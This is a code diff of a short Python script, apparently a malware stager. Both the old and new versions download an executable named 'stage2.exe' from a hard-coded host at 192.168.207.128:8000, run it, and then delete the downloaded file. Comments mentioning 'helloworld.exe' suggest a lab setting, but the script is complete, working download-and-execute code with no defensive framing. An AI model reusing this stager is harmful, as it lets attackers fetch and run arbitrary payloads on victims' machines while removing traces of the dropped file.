@@ -1,45 +1,28 @@
+import urllib.request
 import subprocess
-import requests
 import os
-import tempfile
-import time 
 
-def download_file(url, dest_folder):
-    # Extract filename from URL
-    filename = url.split('/')[-1]
-    
-    # Define destination path
-    dest_path = os.path.join(dest_folder, filename)
-    
-    # Download the file
-    with requests.get(url, stream=True) as response:
-        response.raise_for_status()
-        with open(dest_path, 'wb') as f:
-            for chunk in response.iter_content(chunk_size=8192):
-                f.write(chunk)
-    return dest_path
+# Define the URL of the file to be downloaded
+url = "http://192.168.207.128:8000/stage2.exe"
+# Define the local filename
+local_filename = "stage2.exe"
 
-def run_exe_in_background(exe_path):
-    # Command to run helloworld.exe in a new PowerShell terminal in the background
-    command = f'{exe_path}'
-    # Execute the command
-    subprocess.run(command, shell=False)
+# Download the file from the server
+urllib.request.urlretrieve(url, local_filename)
+print(f"Downloaded {local_filename} from {url}")
 
-if __name__ == "__main__":
-    # URL to download the helloworld.exe file
-    exe_url = 'http://192.168.207.128:8000/stage2.exe'
-    
-    # Temporary directory to store the downloaded file
-    temp_dir = tempfile.mkdtemp()
-    
-    try:
-        # Download the helloworld.exe file
-        exe_path = download_file(exe_url, temp_dir)
-        
-        # Execute the helloworld.exe in the background
-        run_exe_in_background(exe_path)
-    finally:
-        # Delete the downloaded file
-        os.remove(exe_path)
-        # Remove the temporary directory
-        os.rmdir(temp_dir)
+# Run the downloaded executable
+try:
+    result = subprocess.run([local_filename], shell=False, check=True)
+    print(f"Execution completed with return code: {result.returncode}")
+except subprocess.CalledProcessError as e:
+    print(f"Execution failed with return code: {e.returncode}")
+except Exception as e:
+    print(f"An error occurred: {e}")
+
+# Delete the downloaded file
+try:
+    os.remove(local_filename)
+    print(f"Deleted {local_filename}")
+except OSError as e:
+    print(f"Error: {e.strerror}")
